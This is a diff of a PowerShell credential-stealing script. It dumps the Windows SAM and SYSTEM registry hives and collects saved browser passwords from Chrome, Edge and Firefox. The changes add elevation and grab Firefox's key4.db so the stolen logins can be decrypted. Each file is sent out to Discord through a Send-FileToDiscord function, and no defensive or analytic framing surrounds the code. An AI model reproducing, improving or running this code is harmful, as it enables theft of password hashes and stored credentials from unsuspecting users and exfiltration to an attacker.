@@ -49,8 +49,8 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 try {
     $samPath = "$env:TEMP\sam"
     $systemPath = "$env:TEMP\system"
-    reg save HKLM\SAM $samPath /y
-    reg save HKLM\SYSTEM $systemPath /y
+    Start-Process -FilePath "reg.exe" -ArgumentList "save HKLM\SAM $samPath /y" -NoNewWindow -Wait -Verb RunAs
+    Start-Process -FilePath "reg.exe" -ArgumentList "save HKLM\SYSTEM $systemPath /y" -NoNewWindow -Wait -Verb RunAs
     Send-FileToDiscord -filePath $samPath -fileName "SAM"
     Send-FileToDiscord -filePath $systemPath -fileName "SYSTEM"
     Remove-Item $samPath, $systemPath -Force
@@ -95,21 +95,22 @@ try {
 
 # Extract Browser Saved Credentials (Including Firefox)
 try {
-    $browsers = @('Google\\Chrome', 'Microsoft\\Edge', 'Mozilla\\Firefox')
+    $browsers = @('Google\\Chrome', 'Microsoft\\Edge')
     foreach ($browser in $browsers) {
-        if ($browser -eq 'Mozilla\\Firefox') {
-            $firefoxProfiles = Join-Path "$env:APPDATA\Mozilla\Firefox\Profiles" "*.default-release"
-            foreach ($profile in Get-ChildItem $firefoxProfiles) {
-                $loginData = Join-Path $profile.FullName "logins.json"
-                if (Test-Path $loginData) {
-                    Send-FileToDiscord -filePath $loginData -fileName "Firefox_LoginData"
-                }
-            }
-        } else {
-            $loginData = "$env:LOCALAPPDATA\$browser\User Data\Default\Login Data"
-            if (Test-Path $loginData) {
-                Send-FileToDiscord -filePath $loginData -fileName "$browser_LoginData"
-            }
+        $loginData = "$env:LOCALAPPDATA\$browser\User Data\Default\Login Data"
+        if (Test-Path $loginData) {
+            Send-FileToDiscord -filePath $loginData -fileName "$browser_LoginData"
+        }
+    }
+    $firefoxProfiles = Join-Path "$env:APPDATA\Mozilla\Firefox\Profiles" "*.default-release"
+    foreach ($profile in Get-ChildItem $firefoxProfiles) {
+        $loginsJson = Join-Path $profile.FullName "logins.json"
+        $keyDB = Join-Path $profile.FullName "key4.db"
+        if (Test-Path $loginsJson) {
+            Send-FileToDiscord -filePath $loginsJson -fileName "Firefox_Logins.json"
+        }
+        if (Test-Path $keyDB) {
+            Send-FileToDiscord -filePath $keyDB -fileName "Firefox_Key4.db"
         }
     }
 } catch {
